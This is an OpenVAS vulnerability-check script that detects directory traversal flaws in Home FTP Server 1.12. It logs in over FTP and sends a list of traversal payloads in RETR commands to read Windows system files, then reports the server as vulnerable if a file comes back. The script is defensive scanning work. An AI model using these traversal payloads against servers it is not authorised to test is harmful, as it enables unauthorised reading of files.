###############################################################################
# OpenVAS Vulnerability Test
#
# Home FTP Server Multiple Directory Traversal Vulnerabilities
#
# Authors:
# Antu Sanadi <santu@secpod.com>
#
# Copyright:
# Copyright (C) 2011 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.801599");
  script_version("2021-04-16T06:57:08+0000");
  script_tag(name:"last_modification", value:"2021-04-16 06:57:08 +0000 (Fri, 16 Apr 2021)");
  script_tag(name:"creation_date", value:"2011-03-04 14:32:35 +0100 (Fri, 04 Mar 2011)");
  script_tag(name:"cvss_base", value:"6.4");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:P");
  script_name("Home FTP Server Multiple Directory Traversal Vulnerabilities");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2011 Greenbone Networks GmbH");
  script_family("FTP");
  script_dependencies("ftpserver_detect_type_nd_version.nasl", "os_detection.nasl");
  script_require_ports("Services/ftp", 21);
  script_mandatory_keys("ftp/home_ftp/detected", "Host/runs_windows");

  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/16259/");

  script_tag(name:"impact", value:"Successful exploitation will allow attackers to read arbitrary files
  on the affected application.");

  script_tag(name:"affected", value:"Home FTP Server version 1.12");

  script_tag(name:"insight", value:"The flaw is due to an error while handling certain requests which can
  be exploited to download arbitrary files from the host system.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one.");

  script_tag(name:"summary", value:"The host is running Home FTP Server and is prone to directory traversal
  vulnerabilities.");

  script_tag(name:"qod_type", value:"remote_vul");
  script_tag(name:"solution_type", value:"WillNotFix");

  exit(0);
}

include("ftp_func.inc");
include("host_details.inc");
include("os_func.inc");
include("misc_func.inc");
include("port_service_func.inc");

port = ftp_get_port( default:21 );
banner = ftp_get_banner( port:port );
if( ! banner || "Home Ftp Server" >!< banner )
  exit(0);

soc1 = open_sock_tcp( port );
if( ! soc1 )
  exit( 0 );

kb_creds = ftp_get_kb_creds();
user = kb_creds["login"];
pass = kb_creds["pass"];

login_details = ftp_log_in( socket:soc1, user:user, pass:pass );
if( ! login_details ) {
  ftp_close( socket:soc1 );
  exit( 0 );
}

exploits = make_list( "RETR  /..\/..\/..\/..\",
                      "RETR ..//..//..//..//",
                      "RETR \\\..\..\..\..\..\..\",
                      "RETR ../../../../../../../../../../../../../" );
files = traversal_files( "Windows" );

res = ftp_send_cmd( socket:soc1, cmd:"PASV" );

foreach exploit( exploits ) {

  foreach pattern( keys( files ) ) {

    file = files[pattern];
    exp = exploit + file;

    res = ftp_send_cmd( socket:soc1, cmd:exp );
    if( res && match = egrep( string:res, pattern:pattern, icase:TRUE ) ) {
      ftp_close( socket:soc1 );
      report  = "Used request:  " + exp + '\n';
      report += "Received data: " + match;
      security_message( port:port, data:report );
      exit( 0 );
    }
  }
}

ftp_close( socket:soc1 );
exit( 0 );
